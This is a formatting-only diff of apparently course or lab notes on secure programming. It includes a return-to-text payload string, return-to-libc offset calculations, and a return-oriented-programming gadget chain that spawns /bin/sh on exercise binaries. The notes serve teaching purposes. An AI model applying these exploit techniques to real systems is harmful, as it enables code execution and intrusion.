@@ -10,11 +10,10 @@ slug: secure-programming-20141104
 
 Training for "return to text" attack.
 
-- binsh: 0x0804a030, but actual address is at 0x08048640.
-- system: 0x080483e0
+-  binsh: 0x0804a030, but actual address is at 0x08048640.
+-  system: 0x080483e0
 
-- `print 'a'*24 + '\xe0\x83\x04\x08' + 'aaaa' + '\x40\x86\x04\x08'`
-
+-  `print 'a'*24 + '\xe0\x83\x04\x08' + 'aaaa' + '\x40\x86\x04\x08'`
 
 ## foo\_5
 
@@ -22,10 +21,10 @@ Training for "return to libc" attack.
 
 Notice: libc.so is provided
 
-- `objdump -d libc.so`
-    - 00019970 <__libc_start_main>:
-    - 0003fc40 <__libc_system>:
-        - offset: 262d0
+-  `objdump -d libc.so`
+   -  00019970 \<__libc_start_main\>:
+   -  0003fc40 \<__libc_system\>:
+      -  offset: 262d0
 
 Example:
 
@@ -33,28 +32,29 @@ Function: libc_start_main's address is :  0xf75f5970
 
 Function: libc_system's address is : 0xf75f5970 + 0x262d0 = 0xf761bc40
 
-- `objdump -R foo_5`
-    - 0804a01c R_386_JUMP_SLOT   __libc_start_main
-- 0804a02c \<binsh\>:
-    - actual address: 08048620
+-  `objdump -R foo_5`
+   -  0804a01c R_386_JUMP_SLOT   __libc_start_main
+-  0804a02c \<binsh\>:
+   -  actual address: 08048620
 
 ## foo\_6
 
 Training for "return-oriented programming" attack.
 
-- int 0x80
-- eax: call what kind of system call. See reference for Linux system call table.
-  In this problem we want to call sys_execve, so we should use "11" for eax.
-- ebx, ecx: arguments for system call. In this case we put the address of
-  "/bin/sh" which is 0x080be568 into ebx and no need of ecx.
-- remember the number of pops, smash the stack
+-  int 0x80
+-  eax: call what kind of system call. See reference for Linux system call
+   table.  In this problem we want to call sys_execve, so we should use "11" for
+   eax.
+-  ebx, ecx: arguments for system call. In this case we put the address of
+   "/bin/sh" which is 0x080be568 into ebx and no need of ecx.
+-  remember the number of pops, smash the stack
 
 ### Gadget 1
 
-- first gadget: 0x080594ac
-- reset eax to 0 by XOR itself
-- value for `pop ebx`: 0x080be568 (/bin/sh)
-- return address of first gadget: 0x0805cc5c
+-  first gadget: 0x080594ac
+-  reset eax to 0 by XOR itself
+-  value for `pop ebx`: 0x080be568 (/bin/sh)
+-  return address of first gadget: 0x0805cc5c
 
 ```nasm
 80594ac:       31 c0                   xor    eax,eax
@@ -64,11 +64,11 @@ Training for "return-oriented programming" attack.
 
 ### Gadget 2
 
-- second gadget: 0x0805cc5c
-- garbage value for `pop edi`: aaaa
-- return address of second gadget: 0x0805cc5c
-- repeat 11 times to make eax = 0x0000000b
-- last return address of second gadget: 0x0806f0e0
+-  second gadget: 0x0805cc5c
+-  garbage value for `pop edi`: aaaa
+-  return address of second gadget: 0x0805cc5c
+-  repeat 11 times to make eax = 0x0000000b
+-  last return address of second gadget: 0x0806f0e0
 
 ```nasm
 805cc5c:       40                      inc    eax
@@ -105,4 +105,4 @@ terminate the input string unexpectedly.
 
 ## Reference
 
-- [Linux System Call Table](http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html)
+-  [Linux System Call Table](http://docs.cs.up.ac.za/programming/asm/derick_tut/syscalls.html)
